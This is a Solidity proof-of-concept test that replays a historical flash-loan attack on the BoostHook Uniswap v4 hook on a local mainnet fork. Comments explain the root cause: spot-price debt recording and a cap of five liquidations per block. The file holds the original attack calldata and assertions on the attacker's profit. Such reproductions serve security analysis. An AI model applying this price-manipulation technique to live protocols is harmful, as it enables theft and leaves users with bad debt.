// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~20.93 WETH attacker profit; ≥38.33 ETH realized protocol bad debt; ~35 ETH residual open debt
// Attacker : 0xb0a019dd22c363e82fa4f96ae1e4b993341f5104
// Attack Contract : 0xb64bff7b5199abcbb98fee2bf4014265fca85a6d
// Vulnerable Contract : 0x3db1ebb71c735980d12422f153987d89f4d7eacc (BoostHook Uni v4 hook)
// Attack Tx : https://etherscan.io/tx/0xb45cc4d9c13c2c24b4bbf71db9e6f52ed24d174ad23ed2622a290289cebd3811
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x3db1ebb71c735980d12422f153987d89f4d7eacc#code
// BoostToken (PERP) : 0x6C6bE583c45075A5A3dA03f81c2874607AC111F8
//
// @Analysis
// Root cause:
//  1. openLong() records debt/holding from the *spot* post-swap without a post-open
//     solvency invariant that survives same-tx pool manipulation.
//  2. afterSwap() auto-liquidations are capped at MAX_LIQS_PER_BLOCK = 5, so an
//     attacker who opens >5 toxic positions in one block leaves residual bad debt
//     after the flash dump reverts the spot price.
// Attack path (atomic): Morpho 120 WETH flash loan → manipulate ETH/PERP Uni v4
//  spot → openLong() × 9 → dump PERP → afterSwap liquidates only 5 → repay flash
//  loan, keep ~20.93 WETH, leave ≥38 ETH bad debt + residual open toxic debt.
//
// PoC strategy: replay the historical attack contract with the original calldata
// at block 25080847 (one before the exploit).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IBoostHook {
    function MAX_LIQS_PER_BLOCK() external view returns (uint16);
    function totalBadDebtETH() external view returns (uint256);
    function totalDebtETH() external view returns (uint256);
    function token() external view returns (address);
}

contract BoostHook_exp is BaseTestWithBalanceLog {
    address constant ATTACKER = 0xB0A019Dd22c363e82fA4f96AE1E4b993341f5104;
    address constant ATTACK_CONTRACT = 0xB64bFf7B5199aBCBb98fEe2Bf4014265fcA85a6D;
    address constant BOOST_HOOK = 0x3DB1ebB71C735980D12422f153987d89f4d7EacC;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant PERP = 0x6C6bE583c45075A5A3dA03f81c2874607AC111F8;

    // Historical attack tx input (Morpho flash 120 WETH, openLong × 9, etc.)
    bytes constant ATTACK_CALLDATA =
        hex"ea769582"
        hex"000000000000000000000000bbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb"
        hex"000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
        hex"0000000000000000000000000000000000000000000000068155a43676e00000"
        hex"0000000000000000000000003db1ebb71c735980d12422f153987d89f4d7eacc"
        hex"0000000000000000000000000000000000000000000000056bc75e2d63100000"
        hex"0000000000000000000000000000000000000000000000001bc16d674ec80000"
        hex"0000000000000000000000006c6be583c45075a5a3da03f81c2874607ac111f8"
        hex"0000000000000000000000009c65d15a671d814ef7be25418fd46139e7366c07"
        hex"0000000000000000000000000000000000000000000000000000000000000009";

    uint256 constant ATTACK_BLOCK = 25_080_848;
    uint256 constant FORK_BLOCK = ATTACK_BLOCK - 1;

    function setUp() public {
        // Online warm: use mainnet alias; build_poc / exhaustive_warm rewrites to anvil.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = WETH;
        attacker = ATTACKER; // balanceLog tracks historical profit address
    }

    function testExploit() public balanceLog {
        IBoostHook hook = IBoostHook(BOOST_HOOK);
        require(hook.MAX_LIQS_PER_BLOCK() == 5, "unexpected MAX_LIQS_PER_BLOCK");
        require(hook.token() == PERP, "unexpected token");

        uint256 badDebtBefore = hook.totalBadDebtETH();
        uint256 wethBefore = IERC20(WETH).balanceOf(ATTACKER);

        // Replay the on-chain attack contract with the historical calldata.
        vm.startPrank(ATTACKER, ATTACKER);
        (bool ok, bytes memory ret) = ATTACK_CONTRACT.call(ATTACK_CALLDATA);
        vm.stopPrank();
        require(ok, string(ret));

        uint256 wethAfter = IERC20(WETH).balanceOf(ATTACKER);
        uint256 badDebtAfter = hook.totalBadDebtETH();
        uint256 debtAfter = hook.totalDebtETH();

        uint256 profit = wethAfter - wethBefore;
        // Historical: ~20.9329 WETH profit, bad debt jump to ≥38.327 ETH.
        assertGt(profit, 20 ether, "attacker WETH profit too low");
        assertGt(badDebtAfter, badDebtBefore, "bad debt did not increase");
        assertGt(badDebtAfter, 38 ether, "realized bad debt below reported floor");
        // Residual open toxic debt remains because only 5 positions liquidate / block.
        assertGt(debtAfter, 30 ether, "expected residual open debt after MAX_LIQS cap");

        emit log_named_decimal_uint("Attacker WETH profit", profit, 18);
        emit log_named_decimal_uint("totalBadDebtETH after", badDebtAfter, 18);
        emit log_named_decimal_uint("totalDebtETH after", debtAfter, 18);
        emit log_named_decimal_uint("badDebt delta", badDebtAfter - badDebtBefore, 18);
    }
}
